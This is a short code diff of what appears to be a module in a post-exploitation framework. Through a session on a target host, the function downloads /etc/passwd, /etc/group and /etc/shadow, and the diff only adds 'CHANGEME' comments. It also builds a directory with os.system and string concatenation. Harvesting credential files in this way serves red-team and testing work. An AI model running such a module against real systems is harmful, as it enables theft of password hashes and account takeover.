@@ -17,9 +17,9 @@ def execute(session, configs, params):
     os.system("mkdir -p " + download_dir)
          
     try:
-        download("/etc/passwd", "passwd")
-        download("/etc/group", "group")
-        download("/etc/shadow", "shadow")
+        download("/etc/passwd", "passwd") # CHANGEME
+        download("/etc/group", "group") # CHANGEME
+        download("/etc/shadow", "shadow") # CHANGEME
         
         return 0
     except:
